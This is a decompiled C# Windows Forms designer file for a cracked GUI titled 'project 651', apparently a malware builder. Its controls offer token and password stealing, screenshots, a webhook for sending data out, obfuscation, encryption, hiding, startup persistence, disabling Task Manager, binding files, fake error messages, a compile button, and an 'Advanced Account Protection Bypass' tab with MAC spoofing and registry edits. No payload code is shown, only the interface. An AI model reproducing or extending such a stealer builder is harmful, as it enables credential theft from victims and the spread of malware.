            this.AAP.Controls.Add(this.groupBox7);
            this.AAP.Controls.Add(this.groupBox10);
            this.AAP.Controls.Add(this.groupBox9);
            this.AAP.Controls.Add(this.pictureBox2);
            this.AAP.Controls.Add(this.label13123);
            this.AAP.Enabled = true;
            this.AAP.HorizontalScrollbarBarColor = true;
            this.AAP.Location = new System.Drawing.Point(4, 35);
            this.AAP.Name = "AAP";
            this.AAP.Size = new System.Drawing.Size(727, 411);
            this.AAP.Style = MetroFramework.MetroColorStyle.Red;
            this.AAP.TabIndex = 1;
            this.AAP.Text = "AAP-Bypass";
            this.AAP.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.AAP.VerticalScrollbarBarColor = true;
            this.AAP.Visible = false;
            // 
            // groupBox7
            // 
            this.groupBox7.BackColor = System.Drawing.Color.Transparent;
            this.groupBox7.Controls.Add(this.stopproxy);
            this.groupBox7.Controls.Add(this.startproxy);
            this.groupBox7.Controls.Add(this.label6);
            this.groupBox7.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox7.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox7.Location = new System.Drawing.Point(0, 133);
            this.groupBox7.Name = "groupBox7";
            this.groupBox7.Size = new System.Drawing.Size(353, 89);
            this.groupBox7.TabIndex = 49;
            this.groupBox7.TabStop = false;
            this.groupBox7.Text = "Proxy";
            // 
            // stopproxy
            // 
            this.stopproxy.Enabled = false;
            this.stopproxy.Location = new System.Drawing.Point(179, 23);
            this.stopproxy.Margin = new System.Windows.Forms.Padding(2);
            this.stopproxy.Name = "stopproxy";
            this.stopproxy.Size = new System.Drawing.Size(170, 60);
            this.stopproxy.Style = MetroFramework.MetroColorStyle.Red;
            this.stopproxy.TabIndex = 49;
            this.stopproxy.Text = "Stop Proxy";
            this.stopproxy.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.stopproxy.Click += new System.EventHandler(this.stopproxy_Click);
            // 
            // startproxy
            // 
            this.startproxy.Location = new System.Drawing.Point(6, 23);
            this.startproxy.Margin = new System.Windows.Forms.Padding(2);
            this.startproxy.Name = "startproxy";
            this.startproxy.Size = new System.Drawing.Size(169, 60);
            this.startproxy.Style = MetroFramework.MetroColorStyle.Red;
            this.startproxy.TabIndex = 49;
            this.startproxy.Text = "Start Proxy";
            this.startproxy.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.startproxy.Click += new System.EventHandler(this.metroButton3_Click_1);
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.BackColor = System.Drawing.Color.Transparent;
            this.label6.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.Goldenrod;
            this.label6.Location = new System.Drawing.Point(3, 106);
            this.label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(0, 16);
            this.label6.TabIndex = 48;
            // 
            // groupBox10
            // 
            this.groupBox10.BackColor = System.Drawing.Color.Transparent;
            this.groupBox10.Controls.Add(this.metroButton6);
            this.groupBox10.Controls.Add(this.metroTextBox1);
            this.groupBox10.Controls.Add(this.label4);
            this.groupBox10.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox10.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox10.Location = new System.Drawing.Point(383, 5);
            this.groupBox10.Name = "groupBox10";
            this.groupBox10.Size = new System.Drawing.Size(343, 122);
            this.groupBox10.TabIndex = 46;
            this.groupBox10.TabStop = false;
            this.groupBox10.Text = "Create Registy File";
            // 
            // metroButton6
            // 
            this.metroButton6.Location = new System.Drawing.Point(117, 83);
            this.metroButton6.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton6.Name = "metroButton6";
            this.metroButton6.Size = new System.Drawing.Size(221, 34);
            this.metroButton6.Style = MetroFramework.MetroColorStyle.Red;
            this.metroButton6.TabIndex = 47;
            this.metroButton6.Text = "Create registry file";
            this.metroButton6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton6.Click += new System.EventHandler(this.metroButton6_Click);
            // 
            // metroTextBox1
            // 
            this.metroTextBox1.FontWeight = MetroFramework.MetroTextBoxWeight.Light;
            this.metroTextBox1.Location = new System.Drawing.Point(117, 20);
            this.metroTextBox1.Name = "metroTextBox1";
            this.metroTextBox1.PromptText = "Registry string here...";
            this.metroTextBox1.Size = new System.Drawing.Size(221, 23);
            this.metroTextBox1.Style = MetroFramework.MetroColorStyle.Red;
            this.metroTextBox1.TabIndex = 47;
            this.metroTextBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.label4.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.ForeColor = System.Drawing.Color.DarkRed;
            this.label4.Location = new System.Drawing.Point(7, 23);
            this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(105, 16);
            this.label4.TabIndex = 47;
            this.label4.Text = "Registry String:";
            // 
            // groupBox9
            // 
            this.groupBox9.BackColor = System.Drawing.Color.Transparent;
            this.groupBox9.Controls.Add(this.label5);
            this.groupBox9.Controls.Add(this.metroButton5);
            this.groupBox9.Controls.Add(this.metroButton4);
            this.groupBox9.Controls.Add(this.metroButton2);
            this.groupBox9.Controls.Add(this.label3);
            this.groupBox9.Controls.Add(this.manualmactxt);
            this.groupBox9.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox9.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox9.Location = new System.Drawing.Point(0, 5);
            this.groupBox9.Name = "groupBox9";
            this.groupBox9.Size = new System.Drawing.Size(353, 122);
            this.groupBox9.TabIndex = 46;
            this.groupBox9.TabStop = false;
            this.groupBox9.Text = "Advanced Account Protection Bypass";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.ForeColor = System.Drawing.Color.Goldenrod;
            this.label5.Location = new System.Drawing.Point(3, 106);
            this.label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(0, 16);
            this.label5.TabIndex = 48;
            // 
            // metroButton5
            // 
            this.metroButton5.Location = new System.Drawing.Point(179, 47);
            this.metroButton5.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton5.Name = "metroButton5";
            this.metroButton5.Size = new System.Drawing.Size(170, 33);
            this.metroButton5.Style = MetroFramework.MetroColorStyle.Red;
            this.metroButton5.TabIndex = 45;
            this.metroButton5.Text = "Generate Random MAC";
            this.metroButton5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton5.Click += new System.EventHandler(this.metroButton5_Click);
            // 
            // metroButton4
            // 
            this.metroButton4.Location = new System.Drawing.Point(6, 83);
            this.metroButton4.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton4.Name = "metroButton4";
            this.metroButton4.Size = new System.Drawing.Size(169, 34);
            this.metroButton4.Style = MetroFramework.MetroColorStyle.Red;
            this.metroButton4.TabIndex = 46;
            this.metroButton4.Text = "Create Backup Reg File";
            this.metroButton4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton4.Click += new System.EventHandler(this.metroButton4_Click);
            // 
            // metroButton2
            // 
            this.metroButton2.Location = new System.Drawing.Point(179, 83);
            this.metroButton2.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton2.Name = "metroButton2";
            this.metroButton2.Size = new System.Drawing.Size(170, 34);
            this.metroButton2.Style = MetroFramework.MetroColorStyle.Red;
            this.metroButton2.TabIndex = 45;
            this.metroButton2.Text = "Bypass";
            this.metroButton2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton2.Click += new System.EventHandler(this.metroButton2_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.DarkRed;
            this.label3.Location = new System.Drawing.Point(8, 24);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(42, 16);
            this.label3.TabIndex = 41;
            this.label3.Text = "Mac: ";
            // 
            // manualmactxt
            // 
            this.manualmactxt.FontWeight = MetroFramework.MetroTextBoxWeight.Light;
            this.manualmactxt.Location = new System.Drawing.Point(54, 21);
            this.manualmactxt.Name = "manualmactxt";
            this.manualmactxt.PromptText = "MAC Address here...";
            this.manualmactxt.Size = new System.Drawing.Size(295, 23);
            this.manualmactxt.Style = MetroFramework.MetroColorStyle.Red;
            this.manualmactxt.TabIndex = 37;
            this.manualmactxt.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(12)))), ((int)(((byte)(12)))), ((int)(((byte)(12)))));
            this.pictureBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pictureBox2.Location = new System.Drawing.Point(649, 334);
            this.pictureBox2.Margin = new System.Windows.Forms.Padding(2);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(73, 53);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 46;
            this.pictureBox2.TabStop = false;
            this.pictureBox2.Click += new System.EventHandler(this.pictureBox2_Click);
            // 
            // label13123
            // 
            this.label13123.AutoSize = true;
            this.label13123.BackColor = System.Drawing.Color.Transparent;
            this.label13123.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label13123.ForeColor = System.Drawing.Color.DarkRed;
            this.label13123.Location = new System.Drawing.Point(644, 390);
            this.label13123.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label13123.Name = "label13123";
            this.label13123.Size = new System.Drawing.Size(47, 16);
            this.label13123.TabIndex = 38;
            this.label13123.Text = "waltix";
            // 
            // Builder
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(773, 518);
            this.Controls.Add(this.metroTabControl1);
            this.MaximizeBox = false;
            this.Name = "Builder";
            this.ShowIcon = false;
            this.Style = MetroFramework.MetroColorStyle.Red;
            this.Text = "project 651 v1.5 - waltix //cracked by enit";
            this.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Builder_FormClosing);
            this.Load += new System.EventHandler(this.Builder_Load);
            ((System.ComponentModel.ISupportInitialize)(this.metroStyleManager1)).EndInit();
            this.metroTabControl1.ResumeLayout(false);
            this.Builders.ResumeLayout(false);
            this.groupBox6.ResumeLayout(false);
            this.groupBox6.PerformLayout();
            this.groupBox5.ResumeLayout(false);
            this.groupBox5.PerformLayout();
            this.groupBox4.ResumeLayout(false);
            this.groupBox4.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.AAP.ResumeLayout(false);
            this.AAP.PerformLayout();
            this.groupBox7.ResumeLayout(false);
            this.groupBox7.PerformLayout();
            this.groupBox10.ResumeLayout(false);
            this.groupBox10.PerformLayout();
            this.groupBox9.ResumeLayout(false);
            this.groupBox9.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.ResumeLayout(false);

		}

		// Token: 0x04000004 RID: 4
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000005 RID: 5
		private global::MetroFramework.Components.MetroStyleManager metroStyleManager1;

		// Token: 0x04000006 RID: 6
		private global::MetroFramework.Controls.MetroTabControl metroTabControl1;

		// Token: 0x04000007 RID: 7
		private global::MetroFramework.Controls.MetroTabPage Builders;

		// Token: 0x04000008 RID: 8
		private global::System.Windows.Forms.GroupBox groupBox6;

		// Token: 0x04000009 RID: 9
		private global::MetroFramework.Controls.MetroCheckBox enabledc;

		// Token: 0x0400000A RID: 10
		private global::MetroFramework.Controls.MetroTextBox txtwebhook;

		// Token: 0x0400000B RID: 11
		private global::System.Windows.Forms.GroupBox groupBox5;

		// Token: 0x0400000C RID: 12
		private global::System.Windows.Forms.Label label3214c1c;

		// Token: 0x0400000D RID: 13
		private global::MetroFramework.Controls.MetroTextBox pumpFiletxt;

		// Token: 0x0400000E RID: 14
		private global::MetroFramework.Controls.MetroCheckBox pumpFile;

		// Token: 0x0400000F RID: 15
		private global::System.Windows.Forms.GroupBox groupBox4;

		// Token: 0x04000010 RID: 16
		private global::System.Windows.Forms.Label label2;

		// Token: 0x04000011 RID: 17
		private global::MetroFramework.Controls.MetroButton testFakeMessage;

		// Token: 0x04000012 RID: 18
		private global::MetroFramework.Controls.MetroCheckBox fakemessage;

		// Token: 0x04000013 RID: 19
		private global::MetroFramework.Controls.MetroTextBox fakemessagetxt;

		// Token: 0x04000014 RID: 20
		private global::System.Windows.Forms.GroupBox groupBox3;

		// Token: 0x04000015 RID: 21
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000016 RID: 22
		private global::System.Windows.Forms.ListView bindedfiles;

		// Token: 0x04000017 RID: 23
		private global::System.Windows.Forms.ColumnHeader columnHeader1;

		// Token: 0x04000018 RID: 24
		private global::System.Windows.Forms.ColumnHeader columnHeader3;

		// Token: 0x04000019 RID: 25
		private global::MetroFramework.Controls.MetroButton metroButton1;

		// Token: 0x0400001A RID: 26
		private global::MetroFramework.Controls.MetroComboBox metroComboBox1;

		// Token: 0x0400001B RID: 27
		private global::MetroFramework.Controls.MetroButton bindadd;

		// Token: 0x0400001C RID: 28
		private global::MetroFramework.Controls.MetroButton bindremove;

		// Token: 0x0400001D RID: 29
		private global::MetroFramework.Controls.MetroButton compilebtn;

		// Token: 0x0400001E RID: 30
		private global::System.Windows.Forms.GroupBox groupBox2;

		// Token: 0x0400001F RID: 31
		private global::MetroFramework.Controls.MetroCheckBox passwords;

		// Token: 0x04000020 RID: 32
		private global::MetroFramework.Controls.MetroCheckBox diswin;

		// Token: 0x04000021 RID: 33
		private global::MetroFramework.Controls.MetroCheckBox encryptst;

		// Token: 0x04000022 RID: 34
		private global::MetroFramework.Controls.MetroCheckBox Obfuscate;

		// Token: 0x04000023 RID: 35
		private global::MetroFramework.Controls.MetroCheckBox screenshot;

		// Token: 0x04000024 RID: 36
		private global::MetroFramework.Controls.MetroCheckBox cetrainerExtension;

		// Token: 0x04000025 RID: 37
		private global::MetroFramework.Controls.MetroCheckBox disableManager;

		// Token: 0x04000026 RID: 38
		private global::MetroFramework.Controls.MetroCheckBox corruptgt;

		// Token: 0x04000027 RID: 39
		private global::MetroFramework.Controls.MetroCheckBox tokensteal;

		// Token: 0x04000028 RID: 40
		private global::MetroFramework.Controls.MetroCheckBox tracecheck;

		// Token: 0x04000029 RID: 41
		private global::MetroFramework.Controls.MetroCheckBox hidecheck;

		// Token: 0x0400002A RID: 42
		private global::MetroFramework.Controls.MetroCheckBox checkstart;

		// Token: 0x0400002B RID: 43
		private global::System.Windows.Forms.GroupBox groupBox1;

		// Token: 0x0400002C RID: 44
		private global::System.Windows.Forms.Label label2123;

		// Token: 0x0400002D RID: 45
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x0400002E RID: 46
		private global::MetroFramework.Controls.MetroCheckBox iconcheck;

		// Token: 0x0400002F RID: 47
		private global::MetroFramework.Controls.MetroButton iconbutton;

		// Token: 0x04000030 RID: 48
		private global::MetroFramework.Controls.MetroTextBox icontxt;

		// Token: 0x04000031 RID: 49
		private global::MetroFramework.Controls.MetroTabPage AAP;

		// Token: 0x04000032 RID: 50
		private global::System.Windows.Forms.GroupBox groupBox10;

		// Token: 0x04000033 RID: 51
		private global::MetroFramework.Controls.MetroButton metroButton6;

		// Token: 0x04000034 RID: 52
		private global::MetroFramework.Controls.MetroTextBox metroTextBox1;

		// Token: 0x04000035 RID: 53
		private global::System.Windows.Forms.Label label4;

		// Token: 0x04000036 RID: 54
		private global::System.Windows.Forms.GroupBox groupBox9;

		// Token: 0x04000037 RID: 55
		private global::System.Windows.Forms.Label label5;

		// Token: 0x04000038 RID: 56
		private global::MetroFramework.Controls.MetroButton metroButton5;

		// Token: 0x04000039 RID: 57
		private global::MetroFramework.Controls.MetroButton metroButton4;

		// Token: 0x0400003A RID: 58
		private global::MetroFramework.Controls.MetroButton metroButton2;

		// Token: 0x0400003B RID: 59
		private global::System.Windows.Forms.Label label3;

		// Token: 0x0400003C RID: 60
		private global::MetroFramework.Controls.MetroTextBox manualmactxt;

		// Token: 0x0400003D RID: 61
		private global::System.Windows.Forms.PictureBox pictureBox2;

		// Token: 0x0400003E RID: 62
		private global::System.Windows.Forms.Label label13123;

		// Token: 0x0400003F RID: 63
		private global::System.Windows.Forms.GroupBox groupBox7;

		// Token: 0x04000040 RID: 64
		private global::MetroFramework.Controls.MetroButton stopproxy;

		// Token: 0x04000041 RID: 65
		private global::MetroFramework.Controls.MetroButton startproxy;

		// Token: 0x04000042 RID: 66
		private global::System.Windows.Forms.Label label6;
	}
}
